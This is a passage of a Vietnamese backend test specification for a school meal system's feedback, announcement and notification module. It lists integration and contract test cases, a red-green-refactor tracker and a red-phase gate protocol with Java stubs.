8. `PUT {quietStart:"25:00"}` → **422**

**Expected Result (PASS):** Cấu hình sống qua restart; 3 loại critical bỏ qua cả cờ tắt lẫn quiet hours; loại thường tắt thì không push nhưng vẫn lưu vết.
**Expected Result (FAIL):** Bước 6 không gửi → người dùng vô tình tắt được cảnh báo thu hồi thực phẩm cho chính mình, đúng thứ BR-138 cấm. Bước 7 không lưu bản ghi → người dùng tắt push rồi **mất luôn** thông báo, không tra lại được ở lịch sử (UC-136).

**Current Status:** 🔴 Not written

---

### MF10-TC-INT-015 — Schema: không cột dẫn xuất; có đủ cột mà `review.md` §H đòi

**Severity:** `HIGH`
**Feature Under Test:** Flyway migration `V{n}__mf10_*.sql`
**Test File:** `.../integration/Mf10SchemaIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-034`, `TC-COND-012`, `TC-COND-017`
**Oracle Source:** `01_MVP_Backend_Implementation_Plan.md` §3 (*"**không** lưu field dẫn xuất"*) · `review.md` **H4** (thiếu khóa liên kết = **blocker**) · **H5** (`critical` dẫn xuất từ `type` — hệ quả L2) · **D1** (cột `code`) · **H7** (`audience_codes`)

**Test Steps (truy vấn `information_schema` — có tiền đề khẳng định):**
1. **Tiền đề:** assert 9 bảng MF10 **tồn tại** ⭐ *(nếu bỏ, mọi assert "không có cột" xanh giả vì không có bảng nào)*
2. Assert **KHÔNG** tồn tại cột: `notifications.critical`, `announcements.revision_count`, `feedbacks.responded`, `feedbacks.editable_until`, `feedbacks.hours_remaining` — **đều là dẫn xuất**
3. Assert **CÓ** cột (nhóm `review.md` §H đòi): `feedbacks.meal_session_id` (NOT NULL — **H4**), `feedbacks.dish_id`, `feedbacks.scope`, `feedbacks.portion_size`, `feedbacks.class_name`, `announcements.audience_codes` (jsonb — **H7**), `announcements.audience_label`
4. Assert **CÓ** cột `code VARCHAR(32)` + `UNIQUE(school_id, code)` trên `feedbacks`/`announcements`/`notifications` (**D1**)
5. Assert kiểu ngày: mọi cột thời gian là `timestamptz`/`date`, **không** `varchar` (**D4**)
6. Assert constraint tồn tại: `ck_fb_low_rating_needs_tag`, `uq_fb_once`, `ck_ann_published_at`, `ck_ntf_roles`, `uq_ntfread`, RULE `r_annrev_no_update`/`no_delete`
7. Assert index: `ix_fb_school_date`, `ix_ann_audience` (GIN trên jsonb), `ix_fb_search` (trigram)
8. Assert `feedbacks` **có** `created_by`/`updated_by` kế thừa `BaseEntity` **và** cột nghiệp vụ riêng `submitter_user_id` — hai thứ khác nhau (**D9**)

**Expected Result (PASS):** 8 nhóm assert xanh — schema khớp cả TDS lẫn 6 blocker của `review.md` §H.
**Expected Result (FAIL):** Thiếu `meal_session_id` → BR-139 **không có dữ liệu để chạy** (H4 nói đúng câu này); có cột `critical` → người gọi tự phong critical để vượt quiet hours (xem `TC-014`).

**Current Status:** 🔴 Not written

---

### MF10-TC-INT-016 — 8 bất biến nghiệp vụ dựng trực tiếp từ BR (thay cho `semantic-audit.ts`)

**Severity:** `HIGH`
**Feature Under Test:** Toàn bộ tầng service + constraint
**Test File:** `.../integration/Mf10BusinessInvariantIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-035`
**Oracle Source:** ⚠️ **`semantic-audit.ts` có 0/54 luật chạm MF10** (đã grep) — khác mọi module P1 khác. Vì vậy 8 bất biến dưới đây **dựng trực tiếp từ BR**, mỗi dòng ghi rõ BR nguồn để không rơi vào **AP-AI-001** (test không có oracle).

**Test Steps:** sau khi chạy toàn bộ seed + 20 thao tác nghiệp vụ ngẫu-nhiên-có-kiểm-soát, assert 8 truy vấn sau đều trả **0 dòng**:

| # | Truy vấn bất biến | BR nguồn |
|---|---|---|
| INV-1 | phản hồi có `submitted_at > servedAt + 24h` (join thẳng `student_distributions.served_at` — MF09 đã merge, `M10-D06`) | **BR-139** |
| INV-2 | phản hồi `submitter_role='PARENT' AND rating<3 AND jsonb_array_length(tags)=0` | **BR-140** |
| INV-3 | phản hồi có từ khóa trong `comment` (match `illness_keywords`) mà `illness_keyword=false` | **BR-142** |
| INV-4 | phản hồi `illness_keyword=true` mà **không** có notification `ALLERGY_ALERT` tương ứng | **BR-142** |
| INV-5 | announcement `status='PUBLISHED'` mà **không** có revision nào | **BR-144** |
| INV-6 | announcement `status='PUBLISHED' AND published_at IS NULL` (hoặc ngược lại) | **UC-017**, `ck_ann_published_at` |
| INV-7 | announcement có `jsonb_array_length(audience_codes)=0` | **UC-017 EX1**, H7 |
| INV-8 | `notification_deliveries` có `attempt > 3`, hoặc `status='FALLBACK_EMAIL'` mà user có `email_fallback=false` | **BR-159** |

**Expected Result (PASS):** 8/8 truy vấn trả 0 dòng sau mọi thao tác.
**Expected Result (FAIL):** INV-3/INV-4 ra dòng → cảnh báo y tế đứt giữa chừng (bản ghi được đánh dấu nhưng không ai được báo, hoặc ngược lại) — đúng lớp lỗi mà mock không thể phát hiện vì cả hai việc đều làm ở client.

**Current Status:** 🔴 Not written
**Implementation Note:** ⚠️ Ghi rõ trong file test: *"MF10 không có luật `semantic-audit.ts`; 8 invariant này là bản thay thế, nguồn là BR."* Nếu sau này Minh/Thảo bổ sung luật cho MF10 vào `semantic-audit.ts` thì **port thêm**, không thay thế bảng này (**F7** §8.1).

---

### MF10-TC-INT-017 — `created_by` do `AuditorAware` điền, khác với `author_user_id` (D9 / L16)

**Severity:** `MEDIUM`
**Feature Under Test:** `common/domain/BaseEntity` + `AuditorAwareConfig`
**Test File:** `.../integration/AuditFieldIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-036`
**Oracle Source:** **D9** — *"`created_by`/`updated_by` là **tên cột reserved** … giá trị được Spring Data JPA tự động điền = email actor; module con **không tự set** hai field này trong service"*; *"field nghiệp vụ 'ai làm việc này' đặt **tên khác** theo khuôn `<hành_động>_by_<loại>_id`"*

**Test Steps:**
1. `school-admin` (`toanpq@dtd.edu.vn`) `POST /announcements` → assert `created_by = 'toanpq@dtd.edu.vn'` (không phải `'system'`, không `null`)
2. Assert `author_user_id` = UUID của actor và **khác kiểu/khác cột** với `created_by` — hai field cùng tồn tại, không ghi đè nhau
3. `PATCH` bởi actor khác → `updated_by` đổi, `created_by` **giữ nguyên**
4. Grep/ArchUnit: package MF10 **không** có `setCreatedBy(` / `setUpdatedBy(`
5. Thao tác chạy ngoài request context (job `WeeklyFeedbackDigestJob`) → `created_by = 'system'`, **không** ném lỗi
6. Assert entity MF10 **không** tự khai lại field `createdBy`/`updatedBy` (kế thừa từ `BaseEntity`)

**Expected Result (PASS):** Audit trail chung hoạt động; field nghiệp vụ và field audit tách bạch đúng D9.
**Expected Result (FAIL):** Module tự khai `created_by` → hai định nghĩa cho cùng một cột, Hibernate mapping vỡ hoặc lưu sai actor. D9 sinh ra sau khi phát hiện đúng lỗi này ở MF03/MF05/MF06/MF12.

**Current Status:** 🔴 Not written
**Implementation Note:** MF10 **đã đúng khuôn D9** từ TDS (L16) — test này là chốt chặn để không ai "đơn giản hóa" bằng cách đổi `author_user_id` thành `created_by`.

---

### MF10-TC-INT-018 — Gửi thông báo end-to-end: quiet hours, retry, email dự phòng (BR-138/158/159)

**Severity:** `HIGH`
**Feature Under Test:** `NotificationPort.publish()` → `NotificationDispatcher` → `DeliveryRetryScheduler` → Mailpit
**Test File:** `.../integration/NotificationDeliveryIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-013`, `TC-COND-014`, `TC-COND-016`
**Oracle Source:** **BR-138**, **BR-158**, **BR-158b**, **BR-159** · **ADR-M10-4** (*"`NotificationPort` là cửa duy nhất"*) · ADR-000 (SMTP = Mailpit ở dev)

**Test Steps:**
1. Clock **23:30 VN**; `publish(MENU_PUBLISHED → school-admin)` → `notification_deliveries.status = DEFERRED`, `next_retry_at = 06:00 hôm sau`; **không** có email
2. Đẩy clock tới `06:00` + chạy scheduler → `status = SENT`, gateway được gọi **1** lần
3. Clock **23:30**; `publish(FOOD_RECALL → parent)` → `SENT` **ngay** (BR-138), bỏ qua quiet hours
4. `publish(MENU_PUBLISHED → U-CATERER-001)` với gateway fail 3 lần (`FX-015`) → chuỗi `FAILED(1..3) → SENT`; **không** email
5. `publish(… → U-ADMIN-001)` gateway luôn fail, `emailFallback=true` → `FALLBACK_EMAIL`; **Mailpit có đúng 1 email** (`GET localhost:8025/api/v1/messages` → `total == 1`)
6. `publish(… → U-TEACHER-001)` luôn fail, `emailFallback=false` → dừng ở `FAILED`; Mailpit **không** tăng
7. ArchUnit: **không** class nào ngoài `com.sfms.mf10` gọi `notificationRepository.save()` — mọi module khác đi qua `NotificationPort` (**ADR-M10-4/C8**)

**Expected Result (PASS):** 6 kịch bản đúng trạng thái; bước 7 khóa kiến trúc để MF05/06/07/11 không tự bịa chính sách gửi riêng.
**Expected Result (FAIL):** Bước 3 bị hoãn → cảnh báo thu hồi thực phẩm kẹt tới sáng. Bước 7 lọt → mỗi module một chính sách quiet hours, BR-158 chỉ đúng ở nơi nào nhớ áp.

**Current Status:** 🔴 Not written
**Implementation Note:** Đẩy thời gian bằng `Clock` tiêm được (`MutableClock`), **không** dùng `Thread.sleep` — test phải chạy dưới 120s.

---

### CONTRACT TEST CASES *(MỚI 2026-08-03 — Bước 1 việc 3, `L21`)*

> **Vì sao có nhóm riêng:** hai TC dưới đây phủ **D11** và **D12** của `02_Module_Completion_Workflow.md` §6 — hai quy ước ra đời **SAU** khi cả 13 TestSpec đã viết, nên **0/13 bộ nào phủ**. Chúng không phải unit (đụng DB + OpenAPI), không phải security (không về quyền), không phải integration nghiệp vụ (không có BR nào đứng sau) — chúng kiểm **hợp đồng**. Cùng dùng **Testcontainers PostgreSQL 16** + tài khoản seed thật (**D13**, không `@WithMockUser` — nó không mang claim `schoolId`).

---

### MF10-TC-CON-001 — Danh sách đổi shape theo vai phải khai `oneOf` và không lộ PII trẻ em (D11 / `M10-D13`)

**Severity:** `CRITICAL`
**Feature Under Test:** `GET /api/v1/feedbacks` và `GET /api/v1/announcements` — schema `oneOf` + khác biệt tập field theo vai
**Test File:** `src/test/java/com/sfms/mf10/contract/RoleShapeContractIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-008` *(BR-145 ẩn danh)*, `TC-COND-013` *(L13 revisions)*
**Oracle Source:** **D11** (`02_Module_Completion_Workflow.md` §6) · **BR-145** *(tổng hợp ẩn danh)* · **ADR-M10-5** · `TDS-MF10` §9.1 bảng `M10-D13` · **S7** *(tên schema giữ tiền tố `PagedResponse`)*

**Preconditions:** container chạy; Flyway `V1`–`V19`; seed `V900__test_fixtures.sql`. Bốn tài khoản seed **thật** (mật khẩu chung `P@ssw0rd123`): `U-0005` (parent), `U-0001` (school-admin), `U-0003` (service-caterers), `U-0004` (teacher). Ít nhất 1 `feedbacks` của `U-0005` và 1 `announcements` `DRAFT` + 1 `PUBLISHED` gửi `["TEACHER"]`.

**Test Steps:**
1. Đăng nhập thật 4 vai qua `POST /api/v1/auth/login` → lấy 4 JWT (**không** `@WithMockUser` — D13).
2. `GET /api/v1/feedbacks?page=1&pageSize=8` bằng **parent** → assert item **CÓ** `studentId`, `student`.
3. Cùng path bằng **school-admin** và **service-caterers** → assert item **KHÔNG** có `studentId`, `student`, `submitterName`, `submitterUserId` — **4 field, kiểm từng cái**, không chỉ kiểm một cái đại diện.
4. `GET /api/v1/announcements?page=1&pageSize=5` bằng **school-admin** → assert item **CÓ** `revisionCount`, và tập trả về **CÓ** bản `DRAFT`.
5. Cùng path bằng **parent** và **teacher** → assert **KHÔNG** có `revisionCount`; **không** bản `DRAFT` nào; parent **không** thấy bản gửi riêng `["TEACHER"]` (CF-M10-6).
6. `GET /v3/api-docs` → assert 4 điều: (a) `PagedResponseFeedbackListItem` và `PagedResponseAnnouncementListItem` **tồn tại**; (b) `items` khai **`oneOf`** với đúng 2 nhánh; (c) `items` **không** rỗng `{}`; (d) tên schema **giữ tiền tố `PagedResponse`** (S7).

**Expected Result (PASS):**
```java
// 3 — PII trẻ em không lọt sang vai tổng hợp (BR-145)
for (String token : List.of(tokenFor("U-0001"), tokenFor("U-0003"))) {
    var item = getJson(token, "/api/v1/feedbacks?page=1&pageSize=8").path("items").get(0);
    assertThat(item.has("studentId")).isFalse();
    assertThat(item.has("student")).isFalse();
    assertThat(item.has("submitterName")).isFalse();
    assertThat(item.has("submitterUserId")).isFalse();
}
// 6 — springdoc phải sinh được schema có ích, không phải {}
var items = apiDocs().at("/components/schemas/PagedResponseFeedbackListItem/properties/items/items");
assertThat(items.has("oneOf")).isTrue();
assertThat(items.path("oneOf")).hasSize(2);
assertThat(items.toString()).isNotEqualTo("{}");      // chữ ký PagedResponse<?> xoá sạch kiểu
```

**Expected Result (FAIL):**
- Bước 3 đỏ ⇒ **rò rỉ PII trẻ em** — cùng lớp lỗi `GET /students` của MF03 và `GET /student-distributions` của MF09, và đây là **lần thứ ba liên tiếp** cùng loại dữ liệu.
- Bước 6 ra `items: {}` ⇒ controller còn dùng `PagedResponse<?>`. Triệu chứng thật: `npm run gen:api` sinh type FE rỗng, FE phải đăng nhập từng vai curl thử mới biết field nào có — đúng **hai phiên làm việc** mà MF03 đã tốn.

**Current Status:** 🔴 Not written

---

### MF10-TC-CON-002 — Field dẫn xuất và field sai kiểu gửi lên phải bị bỏ qua, DB không đổi (D12 / `M10-D14`)

**Severity:** `CRITICAL`
**Feature Under Test:** `PATCH /api/v1/feedbacks/{code}` và `PATCH /api/v1/announcements/{code}` — bẫy Jackson *"200 mà không lưu gì"*
**Test File:** `src/test/java/com/sfms/mf10/contract/WriteDtoContractIT.java`
**TDD Phase:** 🔴 RED
**Condition Ref:** `TC-COND-006` *(L9 illnessKeyword)*, `TC-COND-024`
**Oracle Source:** **D12** (`02_Module_Completion_Workflow.md` §6) · `TDS-MF10` §9.1 bảng `M10-D14` · mẫu `TestSpec-MF05` **TC-027**

**Preconditions:** như `TC-CON-001`. Một `feedbacks` của `U-0005` **còn trong cửa sổ 24h** (không thì 409 `FBA-022` che mất kết quả — đây là bẫy dựng fixture của riêng MF10). Một `announcements` `PUBLISHED` của `U-0001` với `audience_codes = ["TEACHER"]`.

**Test Steps:**
1. Ghi lại nguyên trạng 2 dòng DB (`select *`).
2. **(a) Field DẪN XUẤT** — `PATCH /api/v1/feedbacks/{code}` bằng token `U-0005`, body:
   `{"illnessKeyword": false, "submittedAt": "2020-01-01T00:00:00Z", "student": "Tên Khác", "dish": "Món Khác", "responded": true}`
3. Assert **200 hoặc 422** *(cả hai đều chấp nhận được — điều bị cấm là **200 kèm DB đổi**)*; rồi assert `feedbacks` **không đổi một cột nào** ngoài `updated_at`/`updated_by`.
4. **(b) Đúng tên, SAI KIỂU** — `PATCH /api/v1/announcements/{code}` bằng token `U-0001`, body:
   `{"audience": "Toàn trường"}` *(response trả `audience` là **chuỗi**; thứ sửa được là `audienceCodes` — **mảng**)*
5. Assert `announcements.audience_codes` **vẫn là** `["TEACHER"]` và `audience_label` **không đổi**.
6. **(c) Nhánh ĐÚNG để chứng minh test không mù** — `PATCH …/announcements/{code}` với `{"audienceCodes": ["PARENT_ALL"]}` → assert DB **có** đổi, và `audience_label` được **tính lại**.

**Expected Result (PASS):**
```java
var before = jdbc.queryForMap("select * from feedbacks where code = ?", fbCode);
patch(tokenFor("U-0005"), "/api/v1/feedbacks/" + fbCode,
      """{"illnessKeyword":false,"submittedAt":"2020-01-01T00:00:00Z","student":"Tên Khác"}""");
var after = jdbc.queryForMap("select * from feedbacks where code = ?", fbCode);
assertThat(after.get("illness_keyword")).isEqualTo(before.get("illness_keyword"));  // L9
assertThat(after.get("submitted_at")).isEqualTo(before.get("submitted_at"));        // server đặt
// (b) cùng tên khác kiểu — Jackson bỏ im lặng y hệt lệch tên
patch(tokenFor("U-0001"), "/api/v1/announcements/" + annCode, """{"audience":"Toàn trường"}""");
assertThat(jdbc.queryForObject(
    "select audience_codes::text from announcements where code = ?", String.class, annCode))
  .isEqualTo("[\"TEACHER\"]");
// (c) chứng minh đường ghi thật sự hoạt động
patch(tokenFor("U-0001"), "/api/v1/announcements/" + annCode, """{"audienceCodes":["PARENT_ALL"]}""");
assertThat(...).contains("PARENT_ALL");
```

**Expected Result (FAIL):**
- Bước 3 đỏ ⇒ **client tắt được cảnh báo y tế bằng cách sửa payload** — chính blocker `review.md` H3, nay được khoá thêm một lớp ở tầng hợp đồng ghi.
- Bước 5 đỏ ⇒ hoặc backend nhận nhầm `audience`, hoặc DTO ghi để lọt field dẫn xuất. Triệu chứng ngoài đời: BGH sửa đối tượng nhận, **form báo thành công**, thông báo vẫn đi sai người — không lỗi, không cảnh báo, không log.
- Bước 6 đỏ ⇒ test đang **mù** (endpoint không ghi được gì cả), bước 3/5 xanh vô nghĩa. **Không bỏ bước này.**

**Current Status:** 🔴 Not written

---

## 5. Red-Green-Refactor Tracker

> **54 test case** — 24 unit · 10 security · 18 integration · **2 contract** *(cập nhật 2026-08-03: +`TC-CON-001`/`TC-CON-002`, `L21`)*. Cột 🟢 GREEN điền commit hash khi test xanh lần đầu.

| TC ID | Test File | 🔴 RED confirmed | 🟢 GREEN (commit) | 🔵 REFACTOR note |
|-------|-----------|-----------------|-------------------|------------------|
| `MF10-TC-001` | `domain/FeedbackWindowPolicyTest.java` | `[ ]` | | ⭐ chốt chặn BR-139 ở server (H4) |
| `MF10-TC-002` | `service/FeedbackManageTest.java` | `[ ]` | | ⚠️ blocked bởi H10 (FE chưa có Edit/Delete) |
| `MF10-TC-003` | `domain/QualityTagRuleTest.java` | `[ ]` | | |
| `MF10-TC-004` | `domain/QualityTagRuleTest.java` | `[ ]` | | ⚠️ dễ bị "sửa cho nhất quán" — xem CF-M10-3 |
| `MF10-TC-005` | `domain/IllnessKeywordDetectorTest.java` | `[ ]` | | 1 case ⏸️ chờ F6 (`"sốt cà chua"`) |
| `MF10-TC-006` | `service/FeedbackSubmitTest.java` | `[ ]` | | ⭐ rủi ro số 1 — client tắt được cảnh báo y tế (H3) |
| `MF10-TC-007` | `service/FeedbackSubmitTest.java` | `[ ]` | | MSG-057 là phần backend làm thêm (CF-M10-9) |
| `MF10-TC-008` | `mapper/FeedbackAnonymizationTest.java` | `[ ]` | | ⭐ mục DPO Sign-off (BR-145) |
| `MF10-TC-009` | `service/FeedbackIdentityAccessTest.java` | `[ ]` | | |
| `MF10-TC-010` | `service/AnnouncementRevisionTest.java` | `[ ]` | | |
| `MF10-TC-011` | `service/AnnouncementRevisionTest.java` | `[ ]` | | chống làm giả vết BR-144 |
| `MF10-TC-012` | `domain/AnnouncementStatusTransitionTest.java` | `[ ]` | | |
| `MF10-TC-013` | `mapper/AnnouncementMapperTest.java` | `[ ]` | | |
| `MF10-TC-014` | `notification/NotificationDispatcherTest.java` | `[ ]` | | ⭐ BR-138 — thu hồi thực phẩm |
| `MF10-TC-015` | `domain/QuietHoursPolicyTest.java` | `[ ]` | | ⭐ ô `00:30` (vắt qua nửa đêm) là bắt buộc |
| `MF10-TC-016` | `domain/QuietHoursPolicyTest.java` | `[ ]` | | |
| `MF10-TC-017` | `notification/DeliveryRetryTest.java` | `[ ]` | | hằng số `MAX_ATTEMPTS` để 1 chỗ |
| `MF10-TC-018` | `dto/NotificationEnumContractTest.java` | `[ ]` | | ⭐ **ghi đè TDS §5.2** (L2) — chờ `common/enums` |
| `MF10-TC-019` | `dto/MealTypeContractTest.java` | `[ ]` | | chờ `common/enums/MealType` (D6) |
| `MF10-TC-020` | `dto/RoleKeyContractTest.java` | `[ ]` | | chờ `common/enums/RoleKey` (D6) |
| `MF10-TC-021` | `dto/DateFormatContractTest.java` | `[ ]` | | dùng lại được cho 12 module (D4) |
| `MF10-TC-022` | `dto/PublicIdContractTest.java` | `[ ]` | | |
| `MF10-TC-023` | `service/FeedbackResponseTest.java` | `[ ]` | | ngưỡng 48h chỉ có ở UC — xem F5 |
| `MF10-TC-024` | `service/AnnouncementAudienceTest.java` | `[ ]` | | chờ Minh chốt danh mục `audienceCodes` |
| `MF10-TC-SEC-001` | `security/FeedbackOwnershipIT.java` | `[ ]` | | ⭐ IDOR trên dữ liệu sức khỏe trẻ em |
| `MF10-TC-SEC-002` | `security/Mf10RbacIT.java` | `[ ]` | | |
| `MF10-TC-SEC-003` | `security/Mf10TenantIsolationIT.java` | `[ ]` | | |
| `MF10-TC-SEC-004` | `security/AnnouncementVisibilityIT.java` | `[ ]` | | ⭐ DRAFT lộ ra ngoài (H7) |
| `MF10-TC-SEC-005` | `security/AnnouncementVisibilityIT.java` | `[ ]` | | |
| `MF10-TC-SEC-006` | `security/AnnouncementXssIT.java` | `[ ]` | | sanitize dùng lại được cho MF07 (I8) |
| `MF10-TC-SEC-007` | `security/NotificationLinkValidationTest.java` | `[ ]` | | |
| `MF10-TC-SEC-008` | `security/Mf10AuthAndLoggingIT.java` | `[ ]` | | ⭐ DPO — PDPD |
| `MF10-TC-SEC-009` | `security/FeedbackUploadSecurityIT.java` | `[ ]` | | ⚠️ blocked bởi L8 (TDS chưa có bảng attachment) |
| `MF10-TC-SEC-010` | `contract/OpenApiContractIT.java` | ⏸️ D8 | | `@Disabled` cho tới khi Nam approve D8 |
| `MF10-TC-INT-001` | `integration/FeedbackSubmitIT.java` | `[ ]` | | |
| `MF10-TC-INT-002` | `integration/FeedbackSubmitIT.java` | `[ ]` | | |
| `MF10-TC-INT-003` | `integration/FeedbackConstraintIT.java` | `[ ]` | | |
| `MF10-TC-INT-004` | `integration/FeedbackDuplicateIT.java` | `[ ]` | | ⚠️ `NULL` trong unique index (scope=CLASS) |
| `MF10-TC-INT-005` | `integration/FeedbackRetractIT.java` | `[ ]` | | lọc `deleted_at` phải ở Spec dùng chung |
| `MF10-TC-INT-006` | `integration/FeedbackResponseIT.java` | `[ ]` | | |
| `MF10-TC-INT-007` | `integration/FeedbackDashboardIT.java` | `[ ]` | | ⭐ BR-145 + BR-141 |
| `MF10-TC-INT-008` | `integration/PagedContractIT.java` | `[ ]` | | dùng lại được cho 12 module (§2b) |
| `MF10-TC-INT-009` | `integration/PublicIdContractIT.java` | `[ ]` | | dùng lại được cho 12 module (D1) |
| `MF10-TC-INT-010` | `integration/ErrorEnvelopeIT.java` | `[ ]` | | đổi 1 dòng khi Huy cấp MSG-104+ |
| `MF10-TC-INT-011` | `integration/ClientSuppliedIdIT.java` | `[ ]` | | |
| `MF10-TC-INT-012` | `integration/AnnouncementRevisionIT.java` | `[ ]` | | ⭐ RULE nuốt lệnh im lặng — assert bằng đọc lại |
| `MF10-TC-INT-013` | `integration/NotificationReadIT.java` | `[ ]` | | ⭐ CF-M10-10 |
| `MF10-TC-INT-014` | `integration/NotificationPreferenceIT.java` | `[ ]` | | |
| `MF10-TC-INT-015` | `integration/Mf10SchemaIT.java` | `[ ]` | | |
| `MF10-TC-INT-016` | `integration/Mf10BusinessInvariantIT.java` | `[ ]` | | thay `semantic-audit.ts` (F7) |
| `MF10-TC-INT-017` | `integration/AuditFieldIT.java` | `[ ]` | | |
| `MF10-TC-INT-018` | `integration/NotificationDeliveryIT.java` | `[ ]` | | cần Mailpit trong CI |
| `MF10-TC-CON-001` | `contract/RoleShapeContractIT.java` | `[ ]` | | ⭐ **D11 / `M10-D13`** — lần thứ 3 liên tiếp PII trẻ em lọt qua danh sách theo vai |
| `MF10-TC-CON-002` | `contract/WriteDtoContractIT.java` | `[ ]` | | ⭐ **D12 / `M10-D14`** — bẫy Jackson "200 mà không lưu gì"; **giữ bước (c)** nếu không test sẽ mù |

### 5.1 Red Gate Protocol (CASE 2.0 — GATE-2)

> ⭐ Gate **quan trọng nhất**. Trước khi implement, chạy toàn bộ suite với stub ném lỗi. **Mọi test PHẢI FAIL.** Test nào PASS ngay → **AP-AI-002 detected** → reject và viết lại.

**Stub cho Red Phase (Java — KHÔNG dùng TypeScript như template):**

```java
// Red Phase — implementation stub (PHẢI throw)
@Service
public class FeedbackServiceImpl implements FeedbackService {
    @Override public FeedbackDetail submit(SubmitFeedbackRequest req, AuthUser actor) {
        throw new UnsupportedOperationException("Not implemented — Red Phase stub");
    }
    @Override public FeedbackDetail update(String code, UpdateFeedbackRequest req, AuthUser actor) {
        throw new UnsupportedOperationException("Not implemented — Red Phase stub");
    }
    // retract / listMine / listForSchool / getDetail / eligibleMeals — tương tự
}

@Service
public class AnnouncementServiceImpl implements AnnouncementService { /* mọi method throw */ }

@Service
public class NotificationDispatcherImpl implements NotificationPort {
    @Override public String publish(NotificationCommand cmd) {
        throw new UnsupportedOperationException("Not implemented — Red Phase stub");
    }
}
```

**Red Gate Verification:**

| TC ID | Stub Result | Expected | Actual | Root Cause (nếu PASS bất thường) |
|-------|-------------|----------|--------|----------------------------------|
| `MF10-TC-001` | `throw UnsupportedOperationException` | 🔴 FAIL | ☐ FAIL ☐ PASS | ☐ Tautology ☐ Shared state ☐ Hallucinated import |
| `MF10-TC-004` | `throw` | 🔴 FAIL | ☐ FAIL ☐ PASS | ☐ *(rủi ro cao: test khẳng định "**không** chặn Teacher" — xanh sẵn khi chưa có gì để chặn)* |
| `MF10-TC-008` | mapper chưa tồn tại | 🔴 FAIL (compile) | ☐ FAIL ☐ PASS | ☐ *(rủi ro cao nhất: assert "**không có** field" đúng sẵn khi DTO rỗng)* |
| `MF10-TC-015` | `QuietHoursPolicy` chưa có | 🔴 FAIL (compile) | ☐ FAIL ☐ PASS | ☐ Hallucinated contract |
| `MF10-TC-018` | `NotificationType` chưa có ở `common/enums` | 🔴 FAIL (compile) | ☐ FAIL ☐ PASS | ☐ Hallucinated contract |
| `MF10-TC-SEC-004` | controller chưa có `@PreAuthorize` | 🔴 FAIL | ☐ FAIL ☐ PASS | ☐ *(rủi ro: 404 do thiếu endpoint chứ không do guard)* |
| `MF10-TC-INT-007` | `throw` | 🔴 FAIL | ☐ FAIL ☐ PASS | ☐ *(rủi ro: `doesNotContain` xanh vì response rỗng)* |
| `MF10-TC-INT-012` | bảng chưa tạo | 🔴 FAIL (SQL) | ☐ FAIL ☐ PASS | ☐ *(rủi ro: 0 dòng bị đổi vì không có bảng)* |
| `MF10-TC-INT-015` | bảng chưa tạo | 🔴 FAIL (SQL) | ☐ FAIL ☐ PASS | ☐ *(rủi ro: "không có cột" đúng sẵn)* |
| `MF10-TC-INT-016` | bảng chưa tạo | 🔴 FAIL (SQL) | ☐ FAIL ☐ PASS | ☐ *(rủi ro: 8 truy vấn trả 0 dòng vì không có dữ liệu)* |
| *(42 TC còn lại)* | `throw` / chưa có endpoint | 🔴 FAIL | ☐ | |

> ⚠️ **Bốn loại "PASS giả" riêng của MF10 — phải phân biệt:**
> 1. **Test khẳng định field KHÔNG có mặt** (`TC-008`, `TC-SEC-005`, `TC-INT-007`, `TC-INT-015`, `TC-INT-009`). Đây là nhóm **lớn nhất và nguy hiểm nhất** của module vì BR-145 vốn được diễn đạt bằng phủ định. Với DTO rỗng/response rỗng thì mệnh đề phủ định **đúng sẵn** → xanh giả. **Cách chặn:** mỗi test loại này bắt buộc có **tiền đề khẳng định** trước — assert entity **có** `studentId` ở DB, assert response **có** `title`/`rating`, assert bảng **tồn tại** — rồi mới assert cái không có. Các test ở §4 đã ghi sẵn bước tiền đề, **không được bỏ khi implement**.
> 2. **Test khẳng định điều KHÔNG bị chặn** (`TC-004` Teacher không cần tag, `TC-023` không chặn trả lời trễ). Stub rỗng không chặn gì → xanh giả. **Cách chặn:** cặp đôi với ô đối chứng **trong cùng test** (`TC-004` có sẵn bước 2 kiểm Parent **bị** chặn).
> 3. **`SEC-*` PASS vì endpoint chưa tồn tại** (404 ≠ 403). → Assert **đúng mã 403** + `error.code == "FBA-005"`, không assert `isNot2xx()`.
> 4. **`TC-001`/`TC-015`/`TC-017` PASS bằng tautology** nếu test tính kỳ vọng bằng chính hằng số của production (`FEEDBACK_WINDOW`, `MAX_ATTEMPTS`, `quietStart`). → Ở **ô biên**, viết **giá trị tuyệt đối** (`Instant.parse("2026-06-30T14:00:00Z")`, `LocalTime.of(22,0)`, `attempt == 3`) để nếu ai đổi hằng số thì test đỏ ngay.

**Red Gate Evidence:**
- Stub commit hash: `___`
- Tất cả FAIL? ☐ Yes → **GATE-2 PASS** (T2→T3) → tiếp tục implement
- Log: `target/red-gate-evidence.log` (sinh bằng `./mvnw test -Dsurefire.reportFormat=plain`)

---

## 6. Entry / Exit Criteria

### Entry Criteria (Điều kiện bắt đầu)

- [ ] **TDS-MF10_Backend.md** (`SFMS-MF10-IMP-001`) đã review chéo đủ 4 vai (Huy §2 · Mạnh §5+§9 · Minh §8+§9 · Thảo §13) và Nam final approve
- [ ] **Logic Issues §2 (L1–L17) đã confirm với Nam** — đặc biệt **L2** (`NotificationType` 4→7 giá trị, ghi đè TDS §5.2 và kéo theo bỏ cột `critical`), L1/L3/L4/L5 (D1/D6/D7 ghi đè), và L9–L12 (mock FE sai, TDS đúng theo `review.md` §H)
- [ ] **TDS §5.2/§9 đã bổ sung `feedback_attachments` + endpoint upload** (L8/D10) — nếu chưa, `MF10-TC-SEC-009` giữ 🔴 và ghi lý do, **không** bỏ test
- [ ] Nền chung của Nam sẵn sàng: `common/domain/BaseEntity` (D9), `common/storage/StorageService` (D10), **`common/enums/{NotificationType, MealType, RoleKey}`** (D6), `common/dto/PagedResponse` + `ErrorResponse` (D2), `@RestControllerAdvice`, `code_sequences` (D1/D5)
- [ ] **Flyway V1** đã có 9 bảng MF10 + CHECK (`ck_fb_low_rating_needs_tag`, `ck_ann_published_at`, `ck_ntf_roles`) + `uq_fb_once` + `uq_ntfread` + **RULE** `r_annrev_no_update`/`no_delete`; extension `pg_trgm` + `unaccent`; `V{n}__seed_mf10.sql` đã **quy đổi ISO / `LUNCH` / 7 loại notification / `meal_session_id`** (TDS §11.2 + TDS-05)
